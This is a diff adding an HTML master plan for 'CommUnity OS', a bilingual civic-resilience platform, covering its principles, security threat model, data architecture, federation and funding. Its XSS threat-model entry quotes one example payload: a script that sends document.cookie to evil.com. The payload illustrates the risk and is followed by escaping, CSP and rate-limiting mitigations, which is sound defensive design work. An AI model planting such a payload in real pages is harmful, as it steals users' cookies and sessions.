@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>CommUnity OS Master Plan v5</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300..800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600;8..60,700&display=swap" rel="stylesheet">
+<style>
+:root{--deep:#1a3c34;--forest:#2d5a4e;--sage:#5a8a78;--cream:#faf8f4;--warm:#f5f0e8;--sand:#e8e0d4;--ink:#2c2c2c;--body:#444;--dim:#888;--coral:#c4654a;--gold:#c4963a;--sky:#7aadc6;--display:'Fraunces',Georgia,serif;--sans:'Outfit',system-ui,sans-serif}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--sans);background:var(--cream);color:var(--body);line-height:1.7;font-size:15px}
+.page{max-width:820px;margin:0 auto;padding:24px 20px 60px}
+h1{font-family:var(--display);font-size:1.8rem;color:var(--deep);margin-bottom:4px;line-height:1.3}
+.subtitle{font-size:.82rem;color:var(--dim);margin-bottom:24px}
+.version{font-size:.7rem;color:var(--sage);font-weight:600;letter-spacing:.15em;text-transform:uppercase;margin-bottom:8px}
+
+/* Sections */
+.section{background:#fff;border-radius:14px;padding:0;margin:16px 0;border:1px solid var(--sand);overflow:hidden}
+.section summary{display:flex;align-items:center;gap:10px;padding:16px 20px;cursor:pointer;list-style:none;font-family:var(--display);font-size:1.05rem;font-weight:600;color:var(--deep);transition:.15s}
+.section summary:hover{background:var(--warm)}
+.section summary::-webkit-details-marker{display:none}
+.section summary::marker{display:none}
+.section summary .arrow{margin-left:auto;transition:transform .2s;font-size:.7rem;color:var(--dim)}
+.section[open] summary .arrow{transform:rotate(180deg)}
+.section-body{padding:4px 20px 20px;font-size:.84rem;line-height:1.8}
+.section-body p{margin:8px 0}
+.section-body h3{font-family:var(--sans);font-size:.9rem;font-weight:600;color:var(--deep);margin:18px 0 6px}
+.section-body h4{font-family:var(--sans);font-size:.82rem;font-weight:600;color:var(--forest);margin:12px 0 4px}
+
+/* Tags */
+.tag{display:inline-block;font-size:.6rem;font-weight:600;padding:2px 8px;border-radius:6px;margin-left:6px;vertical-align:middle}
+.tag-new{background:rgba(196,150,58,.12);color:var(--gold)}
+.tag-done{background:rgba(90,138,120,.12);color:var(--sage)}
+.tag-security{background:rgba(196,101,74,.1);color:var(--coral)}
+
+/* Tables */
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:.78rem}
+th{text-align:left;font-weight:600;color:var(--deep);border-bottom:2px solid var(--sand);padding:8px 10px}
+td{padding:6px 10px;border-bottom:1px solid var(--sand);vertical-align:top}
+tr:last-child td{border-bottom:none}
+
+/* Code */
+code{background:var(--warm);padding:2px 6px;border-radius:4px;font-size:.78rem;font-family:'SF Mono',monospace}
+pre{background:var(--deep);color:var(--cream);padding:14px;border-radius:10px;overflow-x:auto;font-size:.72rem;line-height:1.6;margin:10px 0}
+
+/* Callouts */
+.callout{background:var(--warm);border-radius:10px;padding:14px;margin:12px 0;border-left:4px solid var(--sage);font-size:.82rem}
+.callout-warn{border-left-color:var(--coral);background:rgba(196,101,74,.04)}
+.callout-new{border-left-color:var(--gold);background:rgba(196,150,58,.04)}
+
+/* Principle cards */
+.principle{display:flex;gap:10px;margin:8px 0;padding:10px 14px;background:var(--warm);border-radius:10px}
+.principle-num{font-family:var(--display);font-weight:700;color:var(--sage);font-size:1.1rem;flex-shrink:0;width:24px}
+.principle-text{font-size:.82rem}
+.principle-text strong{color:var(--deep)}
+
+/* Arc */
+.arc{display:flex;gap:0;margin:20px 0;flex-wrap:wrap}
+.arc-item{flex:1;min-width:100px;text-align:center;padding:12px 8px;position:relative}
+.arc-item::after{content:'→';position:absolute;right:-6px;top:50%;transform:translateY(-50%);color:var(--dim);font-size:.7rem}
+.arc-item:last-child::after{display:none}
+.arc-label{font-family:var(--display);font-weight:700;font-size:.82rem;color:var(--deep)}
+.arc-desc{font-size:.65rem;color:var(--dim);margin-top:2px}
+
+/* Print */
+@media print{.section{break-inside:avoid} summary .arrow{display:none} .section[open] .section-body{display:block!important}}
+@media(max-width:600px){h1{font-size:1.4rem} .arc{flex-direction:column} .arc-item::after{display:none}}
+
+/* Nav */
+.nav-bar{position:sticky;top:0;background:rgba(250,248,244,.95);backdrop-filter:blur(8px);border-bottom:1px solid var(--sand);padding:10px 20px;z-index:10;display:flex;align-items:center;gap:12px}
+.nav-bar a{color:var(--sage);text-decoration:none;font-size:.75rem;font-weight:500}
+.nav-bar .logo{font-family:var(--display);font-weight:700;color:var(--deep);font-size:.95rem}
+</style>
+</head>
+<body>
+
+<div class="nav-bar">
+  <span class="logo">CommUnity OS</span>
+  <a href="https://comm-unity-os.org">Site</a>
+  <a href="#security">Security</a>
+  <a href="#federation">Federation</a>
+  <a href="#architecture">Architecture</a>
+  <a href="#phases">Phases</a>
+</div>
+
+<div class="page">
+
+<div class="version">Master Plan v5.0 · March 30, 2026</div>
+<h1>CommUnity OS Master Plan</h1>
+<div class="subtitle">Sole authority document for all platform builds. Full-document updates only — never append. Any new build thread reads this first.</div>
+
+<!-- WHY -->
+<details class="section" open>
+<summary>Why This Exists <span class="arrow">▼</span></summary>
+<div class="section-body">
+<p>The One Big Beautiful Bill Act (signed July 4, 2025) enacted the largest cuts to American safety net programs in history: $1 trillion from Medicaid, up to $187 billion from SNAP. Over 8,000 federal web pages and 3,000+ datasets have been removed or altered. The USDA eliminated its own 30-year hunger survey so no one can measure what happens next.</p>
+<p>No civic technology platform bridges the gap from crisis survival to community governance. Every existing platform — Findhelp, 211, mRelief, Code for America, Decidim, Loomio, Mutual Aid Hub — occupies one segment. Nobody connects them. Nobody has articulated the theory that the connection matters — that a person who finds food through a platform might, over time, use that same platform to evaluate their alderman.</p>
+<p>CommUnity OS does. And the research confirms no one else has built it.</p>
+</div>
+</details>
+
+<!-- WHAT -->
+<details class="section">
+<summary>What CommUnity OS Is <span class="arrow">▼</span></summary>
+<div class="section-body">
+<p>A free bilingual civic resilience platform. 22 pages. Static HTML + Google Apps Script + Google Sheets + Firebase read cache. $7/year to operate. One zip code entry. No account. No email. No tracking. Everything runs on a single reasoning scaffold: <strong>Normal → Broken → Fix</strong>.</p>
+<p>The platform is not a website. It is a nervous system for civic resilience. One person enters a zip code. That is the seed. From that single input, they see what's available near them, what they need to know, who's nearby, and how their community is doing. When a second person enters the same zip, a community forms. When communities connect through the federated data chain, a national picture emerges — bottom-up, for the first time.</p>
+
+<div class="arc">
+  <div class="arc-item"><div class="arc-label">Survive</div><div class="arc-desc">Food, health, emergencies</div></div>
+  <div class="arc-item"><div class="arc-label">Understand</div><div class="arc-desc">Rights, money, law</div></div>
+  <div class="arc-item"><div class="arc-label">Connect</div><div class="arc-desc">Neighbors, mutual aid</div></div>
+  <div class="arc-item"><div class="arc-label">Grow</div><div class="arc-desc">Food, gardens, sovereignty</div></div>
+  <div class="arc-item"><div class="arc-label">Govern</div><div class="arc-desc">Evaluate, audit, propose</div></div>
+</div>
+</div>
+</details>
+
+<!-- SEVEN PRINCIPLES -->
+<details class="section">
+<summary>The Seven Principles (Fluid Democracy) <span class="arrow">▼</span></summary>
+<div class="section-body">
+<div class="principle"><div class="principle-num">1</div><div class="principle-text"><strong>Infrastructure Precedes Authority.</strong> Build the tools. Let communities decide how to use them.</div></div>
+<div class="principle"><div class="principle-num">2</div><div class="principle-text"><strong>Legitimacy Composited.</strong> Trust earned from multiple domains. No single source validates.</div></div>
+<div class="principle"><div class="principle-num">3</div><div class="principle-text"><strong>Grievance → Codification.</strong> Complaints become proposals. Proposals become policy.</div></div>
+<div class="principle"><div class="principle-num">4</div><div class="principle-text"><strong>Access = Framing.</strong> How you enter a system determines what you can do inside it.</div></div>
+<div class="principle"><div class="principle-num">5</div><div class="principle-text"><strong>Information Topology.</strong> Who can see what determines who can act on what. (Original coinage.)</div></div>
+<div class="principle"><div class="principle-num">6</div><div class="principle-text"><strong>Systems Persist.</strong> Platforms that cost money die when funding dies. $7/year can't die.</div></div>
+<div class="principle"><div class="principle-num">7</div><div class="principle-text"><strong>Builder Need Not Operate.</strong> The first builder who is not the first builder is the proof.</div></div>
+</div>
+</details>
+
+<!-- SECURITY ARCHITECTURE — NEW -->
+<details class="section" id="security">
+<summary>Security Architecture <span class="tag tag-new">NEW</span> <span class="tag tag-security">CRITICAL</span> <span class="arrow">▼</span></summary>
+<div class="section-body">
+
+<h3>Threat Model</h3>
+<p>CommUnity OS has no user accounts, no passwords, no cookies, no sessions. This eliminates entire classes of attack (session hijacking, credential stuffing, brute force login). But the accountless model introduces its own risks:</p>
+
+<h4>1. Cross-Site Scripting (XSS)</h4>
+<p><strong>Risk:</strong> User-submitted content (discussion posts, needs, evaluation notes) rendered as HTML could inject malicious scripts. An attacker posts <code>&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</code> in a discussion.</p>
+<p><strong>Current mitigation:</strong> <code>esc()</code> function in discuss.html replaces <code>&lt;</code> and <code>&gt;</code> with HTML entities on every render. <code>sanitize()</code> in Code.gs strips HTML server-side.</p>
+<p><strong>Enhancement:</strong> Add Content Security Policy header via Netlify <code>_headers</code> file. CSP prevents inline script execution even if escaping fails.</p>
+<div class="callout">
+<strong>Netlify _headers file:</strong><br>
+<code>/*<br>&nbsp;&nbsp;Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' https://*.firebaseio.com https://script.google.com https://*.googleapis.com https://fonts.googleapis.com https://phzmapi.org; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://*.openStax.org; frame-ancestors 'none'; base-uri 'self'; form-action 'self'<br>&nbsp;&nbsp;X-Frame-Options: DENY<br>&nbsp;&nbsp;X-Content-Type-Options: nosniff<br>&nbsp;&nbsp;Referrer-Policy: strict-origin-when-cross-origin<br>&nbsp;&nbsp;Permissions-Policy: camera=(self), microphone=(), geolocation=()</code>
+</div>
+
+<h4>2. Cross-Site Request Forgery (CSRF)</h4>
+<p><strong>Risk:</strong> Attacker tricks a user into submitting a POST to Apps Script (e.g., posting a discussion, submitting an evaluation) from a malicious site.</p>
+<p><strong>Current mitigation:</strong> Apps Script requires <code>Content-Type: text/plain</code> to avoid CORS preflight. No cookies or sessions to hijack.</p>
+<p><strong>Enhancement:</strong> Add <code>Sec-Fetch-Site</code> header validation in Code.gs. Check referrer origin. Rate limit by IP (Apps Script can read <code>e.parameter.ip</code> in some contexts) or by display_name + zip + time window.</p>
+
+<h4>3. Abuse / Spam</h4>
+<p><strong>Risk:</strong> Someone scripts 10,000 discussion posts. Or a bot floods the evaluation system with fake scores.</p>
+<p><strong>Current mitigation:</strong> propose.html has client-side rate limiting (3/day). Vote dedup via localStorage.</p>
+<p><strong>Enhancement:</strong> Server-side rate limiting in Code.gs using CacheService as a rate limiter:</p>
+<pre>function rateLimitCheck(key, maxPerHour) {
+  var cache = CacheService.getScriptCache();
+  var count = parseInt(cache.get('rl_' + key) || '0');
+  if (count >= maxPerHour) return false;
+  cache.put('rl_' + key, String(count + 1), 3600);
+  return true;
+}
+
+// Usage in postDiscussion:
+var rlKey = payload.zip + '_' + payload.display_name;
+if (!rateLimitCheck(rlKey, 20)) {
+  return jsonResp({status:'error', message:'Rate limit exceeded'});
+}</pre>
+
+<h4>4. Firebase Data Exposure</h4>
+<p><strong>Risk:</strong> Firebase URL discovered → bulk download of all community data.</p>
+<p><strong>Mitigation (in spec):</strong> Data structured by zip: <code>/discussions/60608/D-123</code>. Security rules: <code>.read: true</code> scoped to <code>$zip</code> children. <code>.write: false</code> on all collections. No bulk download of root collection possible.</p>
+<p><strong>Enhancement:</strong> Firebase App Check (free) adds device attestation. Requests without valid App Check tokens are rejected. Works with reCAPTCHA v3 (invisible, no user friction).</p>
+
+<h4>5. Google Sheet Data Integrity</h4>
+<p><strong>Risk:</strong> Someone with Sheet access modifies historical records.</p>
+<p><strong>Mitigation:</strong> SHA-256 integrity hash on every submission, returned to user as receipt. WriteLog tab tracks every operation. Version history in Google Sheets preserves every change. Data Steward audit trail.</p>
+
+<h4>6. Health Data Privacy (HIPAA-adjacent)</h4>
+<p><strong>Risk:</strong> Community Health Pulse data, even anonymized, could theoretically be de-identified.</p>
+<p><strong>Mitigation:</strong> 3-digit ZIP prefix (populations >20,000). Age ranges, not exact ages. Year-month, not exact dates. k≥11 suppression (exceeds EMA and Health Canada standards). No name, email, IP, or device fingerprint collected. Random sub_id prevents duplicate counting but cannot be traced to a person. HIPAA does not apply (non-covered entity), but Safe Harbor methodology adopted voluntarily.</p>
+
+<h3>Security Headers to Deploy</h3>
+<table>
+<tr><th>Header</th><th>Value</th><th>Protects Against</th></tr>
+<tr><td>Content-Security-Policy</td><td>See CSP block above</td><td>XSS, data injection</td></tr>
+<tr><td>X-Frame-Options</td><td>DENY</td><td>Clickjacking</td></tr>
+<tr><td>X-Content-Type-Options</td><td>nosniff</td><td>MIME-type confusion</td></tr>
+<tr><td>Referrer-Policy</td><td>strict-origin-when-cross-origin</td><td>Information leakage</td></tr>
+<tr><td>Permissions-Policy</td><td>camera=(self), microphone=(), geolocation=()</td><td>Unauthorized API access</td></tr>
+<tr><td>Strict-Transport-Security</td><td>Netlify handles automatically</td><td>Downgrade attacks</td></tr>
+</table>
+
+<div class="callout-warn callout">
+<strong>OWASP Alignment:</strong> The platform addresses OWASP API Security Top 10 risks: BOLA (Broken Object Level Authorization) mitigated by zip-scoped data; injection mitigated by server-side sanitize(); rate limiting mitigated by CacheService rate limiter; security misconfiguration addressed by Firebase security rules + CSP headers.
+</div>
+
+</div>
+</details>
+
+<!-- DATA ARCHITECTURE -->
+<details class="section" id="architecture">
+<summary>Data Architecture (v30) <span class="arrow">▼</span></summary>
+<div class="section-body">
+
+<h3>The Three-Component Pattern</h3>
+<p><strong>Firebase is the cache. Google Sheet is the truth. The cache is rebuildable from the truth.</strong></p>
+<pre>Browser
+  ├── READ  → Firebase (fast, indexed, real-time)
+  │            └── if down → sessionStorage cache
+  │                 └── if empty → Apps Script → Sheet
+  └── WRITE → Apps Script (validates + sanitizes)
+                ├── 1st: Write to Firebase
+                ├── 2nd: Mirror to Sheet (sovereign audit copy)
+                ├── 3rd: Log to WriteLog tab
+                └── Return response</pre>
+
+<h3>Write Rules</h3>
+<p>Firebase: <code>.write: false</code> on all collections. Browser cannot write directly. All writes through Apps Script. Write succeeds if EITHER Firebase or Sheet succeeds. Daily reconciliation repairs drift. WriteLog tracks every operation.</p>
+
+<h3>Failure Modes (7 identified, 7 mitigated)</h3>
+<table>
+<tr><th>#</th><th>Failure</th><th>Fix</th></tr>
+<tr><td>1</td><td>Firebase ↔ Sheet sync drift</td><td>Write order: Firebase 1st, Sheet 2nd, WAL 3rd. Daily reconciliation. Write succeeds if either succeeds.</td></tr>
+<tr><td>2</td><td>Apps Script down</td><td>Form fields preserved in DOM (not localStorage — no privacy leak). User retries manually.</td></tr>
+<tr><td>3</td><td>Firebase down</td><td>Three-layer fallback: Firebase → sessionStorage → Apps Script/Sheet. Stale data labeled.</td></tr>
+<tr><td>4</td><td>Direct Firebase URL access</td><td>Data scoped by zip. .write: false. Soft delete on flag, hard purge after 7 days.</td></tr>
+<tr><td>5</td><td>Unmonitored reconciliation</td><td>Config tab tracks last run. Dashboard warns if stale >48 hours.</td></tr>
+<tr><td>6</td><td>Firebase read exhaustion</td><td>Daily usage estimator. Warning at 40K of 50K limit. Accept risk at community scale.</td></tr>
+<tr><td>7</td><td>No migration rollback</td><td>Each phase: set <code>var FB = '';</code>, redeploy. 2 minutes.</td></tr>
+</table>
+
+<h3>Disaggregated Sheet Architecture</h3>
+<p>Each community uses multiple Sheets, one per domain. Each gets its own 10M cells. Total: 3.7M records per community. No archiving needed.</p>
+<pre>60608-Discuss     → 10M cells (769K posts)
+60608-Needs       → 10M cells (769K listings)
+60608-Govern      → 10M cells (Evals + Assessments + Audits)
+60608-Health      → 10M cells (1M vitals contributions)
+60608-Community   → 10M cells (Users + Stats + Config + WriteLog)
+60608-Hub         → IMPORTRANGE from all above (summaries only)</pre>
+
+<h3>Performance Optimization (from research)</h3>
+<div class="callout-new callout">
+<strong>Immediate wins (no migration required):</strong><br>
+• <strong>CacheService:</strong> 1,000 items, 100KB each, 6hr TTL. Cache-first reads cut SpreadsheetApp calls by 80%.<br>
+• <strong>Batch reads:</strong> Single <code>getDataRange().getValues()</code> for 10K rows = 20x faster than individual getValue() calls.<br>
+• <strong>IndexedDB client cache:</strong> Replace sessionStorage with idb-keyval (600 bytes from CDN). Persists across sessions. 70% reduction in server reads for returning users.<br>
+• <strong>Sheets API v4:</strong> 35% faster reads, 19% faster writes than SpreadsheetApp.<br>
+• <strong>UrlFetchApp.fetchAll():</strong> 10 sequential fetches → 1 parallel batch. 10x faster writes to Firebase.
+</div>
+
+<h3>Database Options Evaluated</h3>
+<table>
+<tr><th>Service</th><th>Storage</th><th>Free Reads</th><th>REST API</th><th>Sovereignty</th><th>Verdict</th></tr>
+<tr><td>Firebase RTDB</td><td>1 GB</td><td>10 GB/mo bandwidth</td><td>✅ Clean JSON</td><td>⚠️ Console only</td><td>Current choice — fast, simple</td></tr>
+<tr><td>Firestore</td><td>1 GiB</td><td>50K docs/day</td><td>✅ Verbose</td><td>⚠️ Console only</td><td>Better queries, offline SDK</td></tr>
+<tr><td>Cloudflare D1</td><td>5 GB</td><td>5M rows/day</td><td>⚠️ Via Worker</td><td>⚠️ SQL console</td><td>Best scale — future migration path</td></tr>
+<tr><td>Supabase</td><td>500 MB</td><td>Unlimited API</td><td>✅ PostgREST</td><td>✅ Table Editor</td><td>Best UI — 7-day pause risk</td></tr>
+<tr><td>Turso</td><td>5 GB</td><td>500M rows/mo</td><td>✅ HTTP API</td><td>⚠️ Drizzle Studio</td><td>Most generous free tier</td></tr>
+<tr><td>Upstash Redis</td><td>256 MB</td><td>500K cmds/mo</td><td>✅ REST</td><td>❌ No UI</td><td>Best cache layer</td></tr>
+</table>
+<p><strong>Recommendation:</strong> Start with Firebase RTDB + IndexedDB + Apps Script CacheService. When approaching limits, migrate read layer to Cloudflare D1 (5M rows/day free). Sheet remains sovereign copy throughout.</p>
+
+<h3>Migration Plan</h3>
+<table>
+<tr><th>Phase</th><th>Action</th><th>Rollback</th><th>Duration</th></tr>
+<tr><td>1</td><td>Add Firebase reads alongside Sheet reads</td><td>Remove FB URL (2 min)</td><td>1 week</td></tr>
+<tr><td>2</td><td>Add dual writes (Firebase + Sheet + WAL)</td><td>Remove FB from writeWithAudit (2 min)</td><td>1 week</td></tr>
+<tr><td>3</td><td>All reads from Firebase; Sheet = audit only</td><td>Set <code>var FB = '';</code> (2 min)</td><td>1 week</td></tr>
+<tr><td>4</td><td>Multi-community Firebase federation</td><td>Remove from registry (2 min)</td><td>Ongoing</td></tr>
+</table>
+
+</div>
+</details>
+
+<!-- FEDERATION -->
+<details class="section" id="federation">
+<summary>Federated Infrastructure <span class="tag tag-new">NEW</span> <span class="arrow">▼</span></summary>
+<div class="section-body">
+
+<h3>Federation Model: Civic Mesh, Not ActivityPub</h3>
+<p>ActivityPub (Mastodon, PeerTube) assumes individual users on separate instances who follow each other. CommUnity OS assumes <strong>communities organized by geography</strong> who share summary data upward. The federation model is closer to how public health data flows (local → county → state → national) than how social media federates.</p>
+
+<div class="callout">
+<strong>Why not ActivityPub:</strong> ActivityPub requires server-to-server communication with inboxes/outboxes, content addressing, and user identity management. CommUnity OS communities don't "follow" each other — they share summary metrics through a standardized schema. The IMPORTRANGE chain is simpler, cheaper ($0), and community-inspectable. ActivityPub is protocol-level complexity for a problem that spreadsheet formulas solve.
+</div>
+
+<h3>Three Federation Layers</h3>
+
+<h4>Layer 1: IMPORTRANGE Chain (audit-grade, hourly)</h4>
+<p>Every level is a Google Sheet with a standardized Summary tab (32 columns). The level above uses <code>=IMPORTRANGE()</code> to pull Summary rows. No code required. No server. No API keys.</p>
+<pre>Community (60608) ─┐
+Community (60609) ─┼─→ Ward (Ward 25) ─┐
+Community (60632) ─┘                    ├─→ City → County → State → National
+Community (60623) ─┐                    │
+Community (60629) ─┼─→ Ward (Ward 12) ─┘</pre>
+<p><strong>Rules:</strong> Counts SUM up. Averages AVERAGE up. Pressure scores AVERAGE up. Same schema at every level. ~50 IMPORTRANGE calls per Sheet. Cities with 50+ wards add a district level.</p>
+
+<h4>Layer 2: Firebase Cross-Zip (real-time, instant)</h4>
+<p>Each community's Firebase project queryable by zip prefix. Registry maps zip → Firebase URL. Cross-zip reads are millisecond REST queries.</p>
+<pre>// Nearby discussions for entire 606xx area
+var url = FB + '/discussions.json?orderBy="zip"&startAt="60600"&endAt="60699"&limitToLast=20';</pre>
+
+<h4>Layer 3: Federation Handshake Protocol</h4>
+<p>How a new community joins:</p>
+<p>1. Create Sheet + deploy Apps Script from template<br>
+2. POST <code>register_community</code> to hub (zip, state, script_url, steward_name)<br>
+3. Hub validates, pings endpoint, assigns community_id<br>
+4. Set <code>MASTER_URL</code> and <code>COMMUNITY_ID</code> in Script Properties<br>
+5. CommunityReporter.gs sends first weekly report (counts only, no personal data)<br>
+6. Community appears in registry lookups and aggregations</p>
+<p><strong>Revocation:</strong> Change Sheet sharing settings. Immediate. Complete. No approval. Community retains all data. Hub retains nothing.</p>
+
+<h3>Data Flow Rules</h3>
+<table>
+<tr><th>Direction</th><th>What Flows</th><th>What Never Flows</th></tr>
+<tr><td>Upward (Community → Hub)</td><td>Counts, averages, resolution rates, pressure scores</td><td>Names, posts, phone numbers, addresses, discussion content</td></tr>
+<tr><td>Downward (Hub → Community)</td><td>Design improvements, alerts, cross-community patterns</td><td>Commands, data modifications, surveillance</td></tr>
+<tr><td>Lateral (Community ↔ Community)</td><td>IMPORTRANGE summaries, Firebase cross-zip queries</td><td>Raw data without consent</td></tr>
+</table>
+
+<h3>Research Context: Federated Civic Networks</h3>
+<p>The Bertelsmann Stiftung (2025) identified federated infrastructure as critical for digital sovereignty and civic participation. The Fediverse (Mastodon, etc.) demonstrates that federated systems can achieve meaningful scale — but also that user experience and complexity remain barriers to adoption. CommUnity OS addresses this by making federation invisible: the user enters a zip code, not an instance URL. The federation happens at the data layer, not the identity layer.</p>
+
+<p>Key insight from decentralized network research: "Federated architectures generally offer profile portability, meaning users can migrate between instances while retaining their social connections." CommUnity OS achieves this architecturally — a community's data is portable because it lives in their Google Sheet, not in the platform.</p>
+
+</div>
+</details>
+
+<!-- DATA GOVERNANCE -->
+<details class="section">
+<summary>Data Governance Charter (CARE + OCAP) <span class="arrow">▼</span></summary>
+<div class="section-body">
+<p>Published on <a href="https://comm-unity-os.org/support" style="color:var(--sage)">support.html</a>. 9 sections including enforcement, verification, and health data addendum.</p>
+<p><strong>Collective Benefit</strong> — data serves communities first. <strong>Authority to Control</strong> — community owns Sheet, decides what to share. <strong>Responsibility</strong> — platform maintains code, community maintains data. <strong>Ethics</strong> — no personal data flows upward. <strong>Ownership</strong> — revocable in one click. <strong>Data Steward</strong> — custodian, not authority. <strong>Enforcement</strong> — one click revocation, no backdoor. <strong>Verification</strong> — every principle auditable by community. <strong>Health Addendum</strong> — k≥11 suppression, Safe Harbor, no commercial use.</p>
+</div>
+</details>
+
+<!-- CURRENT STATE -->
+<details class="section">
+<summary>Current State (v30 — 22 pages) <span class="arrow">▼</span></summary>
+<div class="section-body">
+
+<h3>Pages</h3>
+<p>index, survive, vitals, understand, connect, govern, learn, grow, discuss, needs, evaluate, assess, audit, dashboard, intelligence, propose, knowledge, story, share, support, contribute, 404</p>
+
+<h3>Frontend</h3>
+<p>shared.js: 1,653 lines. shared.css: 503 lines. 3 JSON data files (knowledge_guides, plant_database, audit_templates). Bilingual EN/ES. Accessibility: skip-nav, ARIA, focus-visible, reduced-motion, forced-colors. Offline detection. API health monitoring. PWA install prompt. Arc progress indicator. First-visit onboarding. Print CSS for all page types. Schema.org on every page.</p>
+
+<h3>Backend</h3>
+<p>Code.gs v1.4 + 6 satellite files. Server-side validation (eval scores 0-3, assessment ratings red/yellow/green, body sanitized). SHA-256 integrity hashing. 50+ federal/local API integrations via CivicDataHub.gs.</p>
+
+<h3>Test Suite</h3>
+<p>136+ tests passing. Covers all API endpoints, routing, and page rendering.</p>
+
+</div>
+</details>
+
+<!-- BUILD PHASES -->
+<details class="section" id="phases">
+<summary>Build Phases <span class="arrow">▼</span></summary>
+<div class="section-body">
+
+<h3>Phase 1: Chicago Proof <span class="tag tag-done">COMPLETE</span></h3>
+<p>22 bilingual pages. 27 knowledge guides. Vitals with camera PPG + Health Pulse. 40-plant garden guide. All governance tools. Accessibility. Test suite. README + CONTRIBUTING. Contribute page live on site.</p>
+
+<h3>Phase 2: Network Foundation (Current)</h3>
+<p>Firebase setup (Phase 1 of migration). Security headers via Netlify _headers. Register 6 API keys. 60608 seed content. HCB fiscal sponsorship. GitHub open source push. First non-Chicago community. First non-builder contributor (Tejas — Hindi translation).</p>
+
+<h3>Phase 3: Community Governance</h3>
+<p>Firebase migration Phases 2-3. Disaggregated Sheets. IMPORTRANGE chain operational. Server-side rate limiting. IndexedDB client cache. Community Governance Association charter. Translation pipeline expanded. Second and third communities.</p>
+
+<h3>Phase 4: National Scale</h3>
+<p>Firebase federation (Phase 4). Registry at 100+ communities. IMPORTRANGE chain to state level. NSF CIVIC proposal. Mozilla Incubator application. First publication.</p>
+
+<h3>Phase 5: Global</h3>
+<p>International communities. Regional IMPORTRANGE grouping. Multi-language guides. Data Governance Charter as international standard. Fluid Democracy paper published.</p>
+
+</div>
+</details>
+
+<!-- FUNDING -->
+<details class="section">
+<summary>Funding Sequence <span class="arrow">▼</span></summary>
+<div class="section-body">
+<table>
+<tr><th>Priority</th><th>Source</th><th>Amount</th><th>Status</th></tr>
+<tr><td>1</td><td>HCB Fiscal Sponsorship</td><td>Enables donations</td><td>Application pending</td></tr>
+<tr><td>2</td><td>Mozilla Foundation Incubator</td><td>Democracy × AI cohort</td><td>Requires open source</td></tr>
+<tr><td>3</td><td>NSF CIVIC Stage 1</td><td>$75K (6 months)</td><td>Next solicitation</td></tr>
+<tr><td>4</td><td>Ford Foundation</td><td>Rolling</td><td>Online inquiry</td></tr>
+<tr><td>5</td><td>Knight Foundation</td><td>Civic tech</td><td>When LOI reopens</td></tr>
+<tr><td>6</td><td>Robert Wood Johnson</td><td>Community health</td><td>Rolling</td></tr>
+</table>
+</div>
+</details>
+
+<!-- PUBLICATION PIPELINE -->
+<details class="section">
+<summary>Publication Pipeline (Four-Paper Arc) <span class="arrow">▼</span></summary>
+<div class="section-body">
+<table>
+<tr><th>#</th><th>Paper</th><th>Target</th><th>Status</th></tr>
+<tr><td>1</td><td>A&P instructional architecture</td><td>JMBE / Advances in Phys Ed</td><td>IRB pending</td></tr>
+<tr><td>2</td><td>Bio 233 ASM outcome decomposition</td><td>JMBE</td><td>Alignment built</td></tr>
+<tr><td>3</td><td>Community transfer / civic reasoning</td><td>AALHE / JCI</td><td>Evidence accumulating</td></tr>
+<tr><td>4</td><td>Fluid Democracy theory</td><td>Political theory journal</td><td>Foundations compiled</td></tr>
+</table>
+<p><strong>Additional:</strong> Federated IMPORTRANGE chain (no precedent). Community gardens as civic entry. N→B→F scaffold transfer. Civic pressure index (no equivalent in poli sci).</p>
+</div>
+</details>
+
+<!-- DESIGN PRINCIPLES -->
+<details class="section">
+<summary>Design Principles <span class="arrow">▼</span></summary>
+<div class="section-body">
+<p>1. From love, not antagonism. 2. Plain language. 3. No resume — shows what tools DO. 4. Nothing requiring substantiation. 5. Build where gaps exist, curate where excellence exists. 6. Everything runs on the same idea. 7. Warm aesthetic (cream, Fraunces + Outfit, sage/forest). 8. Bilingual from day one. 9. Civic function, not institutional. 10. The page is the scaffold. 11. The zip code is the seed. 12. The map is the heartbeat. 13. Builder Need Not Operate.</p>
+</div>
+</details>
+
+<!-- BUILD THREAD -->
+<details class="section">
+<summary>Build Thread Instructions <span class="arrow">▼</span></summary>
+<div class="section-body">
+<p>1. Read this document first — sole authority. 2. Warm cream aesthetic, plain language, mobile-first, bilingual. 3. Test against journeys (Maria, Carlos, Doris, Angela, The Builder). 4. CARE/OCAP applies to every feature touching community data. 5. $7/year cost constraint non-negotiable. 6. Firebase is cache, Sheet is truth — never reverse. 7. Every migration phase has 2-minute rollback. 8. The first builder who is not the first builder is the most important milestone.</p>
+</div>
+</details>
+
+<!-- RETIRED -->
+<details class="section">
+<summary>Retired Elements (Do Not Build) <span class="arrow">▼</span></summary>
+<div class="section-body">
+<p>EquityOS branding. Twilio SMS. Supabase. AES-256 encryption. Centralized Sheet sharding. Anonymous Firebase auth. Firebase as sovereign data store (it's cache, not truth). localStorage for write queues (privacy leak). Optimistic UI mixed with confirmed content (separate "Sending" zone).</p>
+</div>
+</details>
+
+<!-- CLOSING -->
+<div style="text-align:center;margin:40px 0;padding:20px">
+<p style="font-family:var(--display);font-style:italic;color:var(--forest);font-size:.95rem;line-height:1.6">One idea. Every tool runs on it. How does this work. Where is it failing. What can we do about it.</p>
+<p style="font-size:.72rem;color:var(--dim);margin-top:12px">CommUnity OS · March 2026 · Chicago, Illinois<br>$7/year · 22 pages · 40 plants · 27 guides · 50+ data sources · Every zip code in America</p>
+</div>
+
+</div>
+
+<script>
+// Expand all for print
+window.addEventListener('beforeprint', function() {
+  document.querySelectorAll('.section').forEach(function(d) { d.open = true; });
+});
+</script>
+
+</body>
+</html>
